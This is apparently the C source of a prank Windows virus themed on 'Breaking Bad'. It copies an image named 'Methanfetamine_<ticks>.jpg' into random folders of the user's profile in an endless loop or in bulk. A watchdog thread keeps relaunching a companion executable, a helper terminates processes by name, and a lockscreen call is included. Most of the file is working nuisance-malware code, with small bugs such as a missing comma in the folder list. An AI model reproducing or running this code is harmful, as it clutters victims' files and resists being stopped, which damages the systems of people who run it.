#include "Breaking Bad Header.h"

CRITICAL_SECTION cs;

 const char* directories[] = {
    "Desktop",
    "Documents",
    "Downloads",
    "Pictures",
    "Music",
    "Videos",
    "Favorites",
    "Saved Games",
    "Contacts",
    "Links",
    "Searches",
    "OneDrive",
    "3D Objects"
    "AppData\\Local",
    "AppData\\LocalLow",
    "AppData\\Roaming",
    "AppData",
    "AppData\\Local\\Temp",
    "AppData\\Local\\Packages",
    "AppData\\Local\\Programs",
    "Desktop\\MethFolder"
    };
 
 int num_dirs = sizeof(directories) / sizeof(directories[0]);

 bool is_process_running(const wchar_t* exe_name) {
     bool found = false;
     // Take a snapshot of all processes
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return false;

     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(pe);

     if (Process32FirstW(hSnap, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, exe_name) == 0) { // compare exe names
                 found = true;
                 break;
             }
         } while (Process32NextW(hSnap, &pe));
     }

     CloseHandle(hSnap);
     return found;
 }

 BOOL kill_process_by_name(const wchar_t* exe_name) {
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
     BOOL success = FALSE;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return FALSE;

     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(pe);

     if (Process32FirstW(snap, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, exe_name) == 0) {
                 // Open process with terminate permission
                 HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                 if (hProcess) {
                     if (TerminateProcess(hProcess, 1)) { 
                         SetConsoleTextAttribute(hConsole, 4);
                         wprintf(L"I Liked it\n", exe_name, pe.th32ProcessID);
                         SetConsoleTextAttribute(hConsole, 7);
                         success = TRUE;
                     }
                     else {
                         wprintf(L"Failed to terminate PID %lu. Error: %lu\n", pe.th32ProcessID, GetLastError());
                     }
                     CloseHandle(hProcess);
                 }
             }
         } while (Process32NextW(snap, &pe));
     }

     CloseHandle(snap);
     return success;
 }

 DWORD WINAPI WatchDog(LPVOID lpParam) {

     char exeDir[MAX_PATH];
     char targetExe[MAX_PATH];
     const char* localFilename = "Breaking Bad Watchdog.exe";
     char cmdline[1024];

     // Get directory of this running process (watchdog)
     if (GetModuleFileNameA(NULL, exeDir, MAX_PATH) == 0) {
         printf("GetModuleFileNameA failed: %lu\n", GetLastError());
         return 1;
     }
     // strip executable name -> leave directory
     char* lastSlash = strrchr(exeDir, '\\');
     if (lastSlash) *lastSlash = '\0';

     // build full path to the target exe in same folder
     snprintf(targetExe, sizeof(targetExe), "%s\\%s", exeDir, localFilename);


     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
     DWORD creation_flags = CREATE_NEW_CONSOLE;

     while (1) {
         // Launch target
         if (!is_process_running(L"Breaking Bad Watchdog.exe"))
         {


             if (!CreateProcessA(
                 NULL,       // lpApplicationName = NULL, we pass full commandline
                 targetExe,    // lpCommandLine (writable)
                 NULL, NULL, // process/thread security
                 FALSE,      // inherit handles
                 creation_flags,           // creation flags
                 NULL, NULL, // environment, working dir (inherit)
                 &si, &pi))
             {
                 DWORD err = GetLastError();
                 printf("Failed to start target. Error: %lu\n", err);
                 // common causes: permission denied, antivirus, or path wrong
                 Sleep(2000);
                 continue;
             }

             // Wait for the target to exit
             WaitForSingleObject(pi.hProcess, INFINITE);

             DWORD exitCode = 0;
             GetExitCodeProcess(pi.hProcess, &exitCode);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);

             Sleep(1000);

         }
     }
 }

HANDLE WatchDogInitializer()
{
     HANDLE hThread = CreateThread(NULL, 0, WatchDog, NULL, 0, NULL);
     return hThread;
}

 DWORD WINAPI spinner_thread(LPVOID param) {
     const char spinner[] = { '|','/','-','\\' };
     int num_frames = sizeof(spinner) / sizeof(spinner[0]);
     int* done = (int*)param;

     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
     SetConsoleTextAttribute(hConsole, 10); 

     int i = 0;
     while (!(*done)) {
         printf("\rLoading: %c", spinner[i % num_frames]);
         fflush(stdout);
         Sleep(100);
         i++;
     }
     printf("\rLoading: Done!\n");
     SetConsoleTextAttribute(hConsole, 7); 
     return 0;
 }

int randomizer(int number_range)
{
	srand(time(NULL));   
	int result = rand() % number_range;                 //not mod + 1 cause i dont want the actuall number_range cause i will be working with arrays
	return result;
}

void FileCreator()
{
   
    Sleep(15);
    char exePath[MAX_PATH];
    //const char *sourcefile = "C:\\Users\\user\\Desktop\\practice\\Walter White Virus\\Walter White Virus\\walter white.png";
    const char* localFilename = "resources\\walter white.png"; // file sitting next to the exe
    char sourcefile[MAX_PATH];

    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        printf("GetModuleFileNameA failed: %lu\n", GetLastError());
        return;
    }

    char* lastSlash = strrchr(exePath, '\\');
    if (lastSlash) {
        *lastSlash = '\0';               //exe path is now the directory
    }

    snprintf(sourcefile, sizeof(sourcefile), "%s\\%s", exePath, localFilename);

    char user_path[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("USERPROFILE", user_path, MAX_PATH);
    if (len == 0 || len > MAX_PATH) {
        printf("Failed to get USERPROFILE.\n");
        return 1;
    }
    
    int random_dir = randomizer(num_dirs);

    char second_path[MAX_PATH];
    snprintf(second_path, sizeof(second_path), "%s\\%s", user_path, directories[random_dir]);//ADD ALL THE PHOTOS TO A TESTING FILE directories[19]

    //printf("Random directory: %s\n", second_path);

    char full_path[MAX_PATH];

   //time_t t = time(NULL);
    DWORD64 ms = GetTickCount64(); // milliseconds since boot

    snprintf(full_path, sizeof(full_path), "%s\\Methanfetamine_%lld.jpg", second_path, ms);
    //printf("Random full directory: %s\n", full_path);

    if (!CopyFileA(sourcefile, full_path, FALSE))
    {
        printf("Copy failed. Error: %lu\n", GetLastError());
        return;
    }
    

    

}

DWORD WINAPI mode1_thread_helper(LPVOID param)
{
    int* finished = (int*)param;
    while (!(*finished))
    {
        FileCreator();
    }

}

void mode_1(HANDLE hWatchDog)
    {
    int done = 0;
    int finished = 0;
    printf("Press Y to Make it Stop\n");
    Sleep(100);
    HANDLE hThread = CreateThread(NULL, 0, spinner_thread, &done, 0, NULL);
    
    

    
    HANDLE hFC = CreateThread(NULL, 0, mode1_thread_helper, &finished, 0, NULL);
   
    char pass;
    
    scanf_s(" %c", &pass, 1);  
    while (toupper(pass) != 'Y' && toupper(pass) != 'N')
    {
        printf("This is Not a Valid Answer. Choose Y or N: ");
        scanf_s(" %c", &pass, 1);
    }
    if (toupper(pass) == 'Y') {
        lockscreen();
        finished = 1;
    }
    
   
    done = 1;        
    WaitForSingleObject(hThread, INFINITE);
    WaitForSingleObject(hFC, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hFC);
    return;
    }

void mode_2(long long int n)
{
    int i;
    const int total = 30; 
    int divisor = (n + total - 1) / total; // ensures no division by zero

    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 10);


    // Print empty bar
    printf("Loading: [");
    for (i = 0; i < total; i++) printf(" ");
    printf("]");
    fflush(stdout);


    printf("\rLoading: ["); 
    fflush(stdout);


    int filled = 0;
    for (i = 1; i <= n; i++) {
        FileCreator();
        if (i % divisor == 0) {
            printf("#");
            fflush(stdout);
            filled++;
        }
        //Sleep(20); 
    }

  
    for (; filled < total; filled++) printf("#");

    printf("] Done!\n");
    SetConsoleTextAttribute(hConsole, 7); 
    return;

}

void logo()
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, 4);
    printf(
        "                                     _                        \n"
        "| | | | ___ (_)  ___   ___   ____   | |__    ___  __ __  __ __\n"
        "| |_| |/ _ \| | / __| / _ \ |  _  \ | ' _ \ / _ \ | '__//  `  |\n"
        "|  _  |  __/| |  \__  \  _/ | | | | |  |_) |  __/ | |   | (_| |\n"
        "|_| |_|\___|| | |___/  \___|| | |_| | _.__/ \___| |_|    \__, |\n"
        "                                                        |____/ \n"
        "                                                               \n");
    SetConsoleTextAttribute(hConsole, 7);
}
